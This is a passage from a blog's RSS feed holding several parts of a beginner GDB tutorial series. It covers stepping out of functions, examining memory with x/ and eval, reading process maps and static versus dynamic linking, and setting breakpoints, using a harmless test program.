</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Breakpoint 1, 0x00000000004018bd in fib_num <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> finish
</span></span><span style="display:flex;"><span>Run till exit from <span style="color:#75715e">#0  0x00000000004018bd in fib_num ()</span>
</span></span><span style="display:flex;"><span>0x0000000000401970 in main <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># See current instruction</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/i $pc
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x401970 &lt;main+84&gt;:  mov    esi,eax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the return value of fib_num()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p $rax
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">55</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example Usage of Step Out<br><br></span>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>Now that you have made it this far, you have mastered the basics of GDB! In the next few guides, I will be going through more advanced techniques to achieve greater efficiency in dynamic analysis through automation.</p>
<p>Stay safe and healthy folks!</p>
<h2 id="7-resources">7. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise.c">stepping-exercise.c</a></li>
<li><a href="/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise">stepping-exercise</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 4 - Examining Memory</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part4-examining-memory/</link>
            <pubDate>Wed, 05 Feb 2025 13:05:09 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part4-examining-memory/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Part 4 of this guide will be kept unusually short as I am currently down with a fever. However, I still wanted to get something out this week.&lt;/p&gt;
&lt;p&gt;Today, we will be taking a look into the examination of process memory using GDB, and I will even showcase a useful trick to examine memory with &lt;em&gt;eval&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&#34;2-examine-command-x&#34;&gt;2. Examine Command (x/)&lt;/h2&gt;
&lt;p&gt;To examine the process&amp;rsquo;s memory, we will always start of with the prefix &lt;code&gt;x/&lt;/code&gt;, followed by whatever we which to examine at a particular address.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Part 4 of this guide will be kept unusually short as I am currently down with a fever. However, I still wanted to get something out this week.</p>
<p>Today, we will be taking a look into the examination of process memory using GDB, and I will even showcase a useful trick to examine memory with <em>eval</em>.</p>
<h2 id="2-examine-command-x">2. Examine Command (x/)</h2>
<p>To examine the process&rsquo;s memory, we will always start of with the prefix <code>x/</code>, followed by whatever we which to examine at a particular address.</p>
<h3 id="21-bytes">2.1 Bytes</h3>
<p>This example shows you how to display 16 bytes from 0x7ffd2d856f1b.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/16bx 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: 0x48    0x65    0x6c    0x6c    0x6f    0x20    0x57    0x6f
</span></span><span style="display:flex;"><span>0x7ffd2d856f23: 0x72    0x6c    0x64    0x21    0x00    0x00    0x7f    0xfb
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining 16 Bytes from Address<br><br></span>
<h3 id="22-half-words-2-bytes">2.2 Half Words (2 Bytes)</h3>
<p>This example shows you how to display 8 half words from 0x7ffd2d856f1b.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/8hx 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: 0x6548  0x6c6c  0x206f  0x6f57  0x6c72  0x2164  0x0000  0xfb7f
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining 8 Half Words from Address<br><br></span>
<h3 id="23-words-4-bytes">2.3 Words (4 Bytes)</h3>
<p>This example shows you how to display 4 words from 0x7ffd2d856f1b.
When dealing with 32 bit binaries, it will be useful to display the memory as a word if there is a pointer at the address of examination.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/4wx 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: 0x6c6c6548      0x6f57206f      0x21646c72      0xfb7f0000
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining 4 Words from Address<br><br></span>
<h3 id="24-giant-words-8-bytes">2.4 Giant Words (8 Bytes)</h3>
<p>This example shows you how to display 2 giant words from 0x7ffd2d856f1b.
For 64 bit binaries, it will be useful to display the memory as a giant word if there is a pointer at the address of examination.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/2gx 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: 0x6f57206f6c6c6548      0xfb7f000021646c72
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining 2 Giant Words from Address<br><br></span>
<h3 id="25-strings">2.5 Strings</h3>
<p>This example shows you how to display the bytes as ASCII characters. This command will iteratively convert the byte from the starting address until it hits a <code>0x00</code> byte.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: <span style="color:#e6db74">&#34;Hello World!&#34;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining String from Address<br><br></span>
<h3 id="26-instructions">2.6 Instructions</h3>
<p>This example shows you how to display 5 instructions from the current instruction.
Note that on x86-64, <code>$pc</code> is just an alias for <code>$rip</code>, which is the instruction pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/5i $pc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x5ecd0af2e1d1 &lt;func_1+8&gt;:   sub    $0x10,%rsp
</span></span><span style="display:flex;"><span>   0x5ecd0af2e1d5 &lt;func_1+12&gt;:  mov    %rdi,-0x8<span style="color:#f92672">(</span>%rbp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   0x5ecd0af2e1d9 &lt;func_1+16&gt;:  mov    %rsi,-0x10<span style="color:#f92672">(</span>%rbp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   0x5ecd0af2e1dd &lt;func_1+20&gt;:  mov    -0x8<span style="color:#f92672">(</span>%rbp<span style="color:#f92672">)</span>,%rax
</span></span><span style="display:flex;"><span>   0x5ecd0af2e1e1 &lt;func_1+24&gt;:  mov    %rax,%rsi
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Examining 5 Instructions from Instruction Pointer<br><br></span>
<h2 id="3-creative-usage-of-eval">3. Creative usage of eval</h2>
<p>If you want to automate your GDB script and set different sizes when examining bytes, you can do the following using <em>eval</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $num_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $addr <span style="color:#f92672">=</span> 0x7ffd2d856f1b
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> eval <span style="color:#e6db74">&#34;x/%dbx %p&#34;</span>, $num_bytes, $addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x7ffd2d856f1b: 0x48    0x65    0x6c    0x6c    0x6f    0x20    0x57    0x6f
</span></span><span style="display:flex;"><span>0x7ffd2d856f23: 0x72    0x6c    0x64    0x21    0x00    0x00    0x7f    0xfb
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Eval Usage Example<br><br></span>
<h2 id="4-conclusion">4. Conclusion</h2>
<p>That is it folks. T&rsquo;was short and mundane, but I hope you found the eval usage meaningful to use in your everyday work. Gotta go rest in bed now.
<img src="/posts/gdb-guides/gdb-guide-part4-examining-memory/images/sumikko-bedtime-loop.gif" alt="sumikko-bedtime-loop"></p>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 3 - Process Maps</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part3-process-maps/</link>
            <pubDate>Wed, 29 Jan 2025 08:58:52 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part3-process-maps/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Happy Chinese New Year! In my previous post, I did mention that I will be taking a break from posting anything due to the holiday season. However, my workaholic self jolted me out of my bed earlier this morning just so that I can squeeze out part 3 of this guide.&lt;/p&gt;
&lt;h2 id=&#34;2-overview&#34;&gt;2. Overview&lt;/h2&gt;
&lt;p&gt;Today&amp;rsquo;s guide will mainly focus on process mappings as I only have about an hour to quickly get this guide out.
However, I think it is also important to cover some background on dynamic and static executables before talking about Process Maps.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Happy Chinese New Year! In my previous post, I did mention that I will be taking a break from posting anything due to the holiday season. However, my workaholic self jolted me out of my bed earlier this morning just so that I can squeeze out part 3 of this guide.</p>
<h2 id="2-overview">2. Overview</h2>
<p>Today&rsquo;s guide will mainly focus on process mappings as I only have about an hour to quickly get this guide out.
However, I think it is also important to cover some background on dynamic and static executables before talking about Process Maps.</p>
<p>Again, the examples used for this walkthrough is the same <a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">test.c</a> file from earlier parts of the guide.</p>
<h2 id="3-dynamic-executables">3. Dynamic Executables</h2>
<p>Firstly, we will compile our test file without any fanciful GCC flags.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc test.c -o test_d
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling a Dynamically Linked Binary<br><br></span>
<p>We can then use the <em>ldd</em> command to inspect the libraries that it depends on.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldd test_d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Output</span>
</span></span><span style="display:flex;"><span>  linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007ffe93378000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x000076a082a00000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  /lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x000076a082d7a000<span style="color:#f92672">)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Showing Shared Library Dependencies<br><br></span>
<p>Looking at the output above, it seems at first glance, that we require 3 libraries. However, <em>linux-vdso.so.1</em>, is just a virtual shared object that doesn&rsquo;t have any physical file on the disk. It&rsquo;s actually part of the kernel that&rsquo;s exported into every program&rsquo;s address space when it&rsquo;s loaded.</p>
<p>Thus, our test binary actually only loads <em>libc.so.6</em> and <em>ld-linux-x86-64.so.2</em> upon running.</p>
<h2 id="4-static-executables">4. Static Executables</h2>
<p>To compile a static executable, we will require additional GCC flags that tell the compiler to cramp all the different library functions into one single binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -static test.c -o test_s
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling a Statically Linked Binary<br><br></span>
<p>Again, we can use the <em>ldd</em> command to check that it is now a standalone executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldd test_s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Output</span>
</span></span><span style="display:flex;"><span>  not a dynamic executable
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Proving that It is Standalone<br><br></span>
<h2 id="5-process-maps">5. Process Maps</h2>
<p>Process Maps are basically a mapping of memory regions to certain sections of a binary or library. Understanding Process Maps will play a crucial part in doing dynamic analysis on a stripped binary. A stripped binary means that it does not contain any symbols and thus, we cannot simply set breakpoints on a function name.</p>
<p>To inspect the memory regions, we can either do it via the old-school method by looking at /proc/$PID/maps or using GDB.</p>
<h3 id="51-via-procpidmaps">5.1 Via /proc/pid/maps</h3>
<p>Run <em>test_d</em> in one of the terminals, and run the following command in a new terminal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /proc/<span style="color:#e6db74">`</span>pidof test_d<span style="color:#e6db74">`</span>/maps
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
</span></span><span style="display:flex;"><span>615276507000-615276508000 r--p <span style="color:#ae81ff">00000000</span> fc:01 <span style="color:#ae81ff">49020965</span>    /tmp/test_d
</span></span><span style="display:flex;"><span>615276508000-615276509000 r-xp <span style="color:#ae81ff">00001000</span> fc:01 <span style="color:#ae81ff">49020965</span>    /tmp/test_d
</span></span><span style="display:flex;"><span>615276509000-61527650a000 r--p <span style="color:#ae81ff">00002000</span> fc:01 <span style="color:#ae81ff">49020965</span>    /tmp/test_d
</span></span><span style="display:flex;"><span>61527650a000-61527650b000 r--p <span style="color:#ae81ff">00002000</span> fc:01 <span style="color:#ae81ff">49020965</span>    /tmp/test_d
</span></span><span style="display:flex;"><span>61527650b000-61527650c000 rw-p <span style="color:#ae81ff">00003000</span> fc:01 <span style="color:#ae81ff">49020965</span>    /tmp/test_d
</span></span><span style="display:flex;"><span>6152a572b000-6152a574c000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>741be5800000-741be5828000 r--p <span style="color:#ae81ff">00000000</span> fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be5828000-741be59bd000 r-xp <span style="color:#ae81ff">00028000</span> fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be59bd000-741be5a15000 r--p 001bd000 fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be5a15000-741be5a16000 ---p <span style="color:#ae81ff">00215000</span> fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be5a16000-741be5a1a000 r--p <span style="color:#ae81ff">00215000</span> fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be5a1a000-741be5a1c000 rw-p <span style="color:#ae81ff">00219000</span> fc:01 <span style="color:#ae81ff">7080047</span>     /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>741be5a1c000-741be5a29000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>741be5a8b000-741be5a8e000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>741be5aa1000-741be5aa3000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>741be5aa3000-741be5aa5000 r--p <span style="color:#ae81ff">00000000</span> fc:01 <span style="color:#ae81ff">7080039</span>     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>741be5aa5000-741be5acf000 r-xp <span style="color:#ae81ff">00002000</span> fc:01 <span style="color:#ae81ff">7080039</span>     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>741be5acf000-741be5ada000 r--p 0002c000 fc:01 <span style="color:#ae81ff">7080039</span>     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>741be5adb000-741be5add000 r--p <span style="color:#ae81ff">00037000</span> fc:01 <span style="color:#ae81ff">7080039</span>     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>741be5add000-741be5adf000 rw-p <span style="color:#ae81ff">00039000</span> fc:01 <span style="color:#ae81ff">7080039</span>     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>7ffc8ca55000-7ffc8ca76000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>7ffc8cb04000-7ffc8cb08000 r--p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>7ffc8cb08000-7ffc8cb0a000 r-xp <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>ffffffffff600000-ffffffffff601000 --xp <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>   <span style="color:#f92672">[</span>vsyscall<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Showing Process Maps - /proc/pid/maps<br><br></span>
<p>From the output above, we know the following base addresses:</p>
<ol>
<li><em>test_d</em> &ndash;&gt; <code>0x615276507000</code></li>
<li><em>libc.so.6</em> &ndash;&gt; <code>0x741be5800000</code></li>
<li><em>ld-linux-x86-64.so.2</em> &ndash;&gt; <code>0x741be5aa3000</code></li>
</ol>
<p>As practice, you can do the same with <em>test_s</em> and get the base address of itself.</p>
<h3 id="52-via-gdb">5.2 Via GDB</h3>
<p>GDB also has a feature to look at the Process Maps via <code>info proc mappings</code>.</p>
<p>For this example, we shall run <em>test_s</em> and attach to it using another terminal.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -p <span style="color:#e6db74">`</span>pidof test_s<span style="color:#e6db74">`</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching to Static Test Process<br><br></span>
<p>Then, run the following command to inspect the Process Maps:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc mappings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">24816</span>
</span></span><span style="display:flex;"><span>Mapped address spaces:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          Start Addr           End Addr       Size     Offset  Perms  objfile
</span></span><span style="display:flex;"><span>            0x400000           0x401000     0x1000        0x0  r--p   /tmp/test_s
</span></span><span style="display:flex;"><span>            0x401000           0x4b7000    0xb6000     0x1000  r-xp   /tmp/test_s
</span></span><span style="display:flex;"><span>            0x4b7000           0x4e1000    0x2a000    0xb7000  r--p   /tmp/test_s
</span></span><span style="display:flex;"><span>            0x4e2000           0x4e6000     0x4000    0xe1000  r--p   /tmp/test_s
</span></span><span style="display:flex;"><span>            0x4e6000           0x4e9000     0x3000    0xe5000  rw-p   /tmp/test_s
</span></span><span style="display:flex;"><span>            0x4e9000           0x4ee000     0x5000        0x0  rw-p   
</span></span><span style="display:flex;"><span>          0x2e5b6000         0x2e5d8000    0x22000        0x0  rw-p   <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      0x7fffc2860000     0x7fffc2881000    0x21000        0x0  rw-p   <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      0x7fffc29b1000     0x7fffc29b5000     0x4000        0x0  r--p   <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      0x7fffc29b5000     0x7fffc29b7000     0x2000        0x0  r-xp   <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   <span style="color:#f92672">[</span>vsyscall<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Showing Process Maps - info proc mappings<br><br></span>
<p>From the output above, we know that the base address of <em>test_s</em> is <code>0x400000</code>.</p>
<p>As practice, you can do the same with <em>test_d</em> and get the base address of itself and its libraries.</p>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>With the memory regions mapped out, we will be able to debug stripped binaries easily. Stay tuned for part 4 where I will be going through on how we can debug our stripped test program. Adios!</p>
<h2 id="7-resources">7. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">test.c</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 2 - Breakpoints &amp; Linux Calling Conventions</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/</link>
            <pubDate>Tue, 21 Jan 2025 12:21:39 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;This post is a continuation from the &lt;a href=&#34;https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part1-basics/&#34;&gt;previous post in this series&lt;/a&gt; and will cover more fundamentals on GDB and dynamic analysis.&lt;/p&gt;
&lt;p&gt;To ensure this post is not too long-winded, I have decided to only go through the following topics today:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Breakpoints&lt;/li&gt;
&lt;li&gt;Linux x86 vs x86_64 Calling Convention&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-breakpoints&#34;&gt;2. Breakpoints&lt;/h2&gt;
&lt;p&gt;A breakpoint is a special marker that you can set in your program to tell GDB to pause (or &amp;ldquo;break&amp;rdquo;) the program&amp;rsquo;s execution when it reaches a certain point.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>This post is a continuation from the <a href="/posts/gdb-guides/gdb-guide-part1-basics/">previous post in this series</a> and will cover more fundamentals on GDB and dynamic analysis.</p>
<p>To ensure this post is not too long-winded, I have decided to only go through the following topics today:</p>
<ol>
<li>Breakpoints</li>
<li>Linux x86 vs x86_64 Calling Convention</li>
</ol>
<h2 id="2-breakpoints">2. Breakpoints</h2>
<p>A breakpoint is a special marker that you can set in your program to tell GDB to pause (or &ldquo;break&rdquo;) the program&rsquo;s execution when it reaches a certain point.</p>
<p>When you set a breakpoint at a specific line of code or address, GDB will make the program stop executing by inserting a <code>int 3</code> instruction just before that point is reached.</p>
<h3 id="21-setting-breakpoints">2.1 Setting Breakpoints</h3>
<p><link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert tip">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Tip</strong>
        </div>
        <div class="alert-body">You can use the shorthand &lsquo;b&rsquo; instead of &ldquo;break&rdquo;</div>
    </div>
</div>

You can set a breakpoint with the following syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break <span style="color:#f92672">[</span>Function<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *<span style="color:#f92672">[</span>Address<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoints - Syntax<br><br></span>
<h3 id="22-regex-breakpoints">2.2 Regex Breakpoints</h3>
<p>Apart from setting breakpoint at specific functions or addresses, there&rsquo;s another cool trick to break on functions that match a regular expression.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Break on every function available</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> rbreak .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Break on function that starts with &#34;func_&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> rbreak ^func_.$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Break on function that ends with &#34;nc_1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> rbreak .nc_1$
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoints via Regex<br><br></span>
<h3 id="23-viewing-breakpoints">2.3 Viewing Breakpoints</h3>
<p>When you have too many breakpoints and things start to get a little messy, you can list down your current breakpoints by doing the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info breakpoints
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example Output</span>
</span></span><span style="display:flex;"><span>Num     Type           Disp Enb Address            What
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>       breakpoint     keep y   0x000062086fb611d1 &lt;func_1+8&gt;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>       breakpoint     keep y   0x000062086fb61203 &lt;func_2+8&gt;
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Listing Breakpoints<br><br></span>
<h3 id="24-deleting-breakpoints">2.4 Deleting Breakpoints</h3>
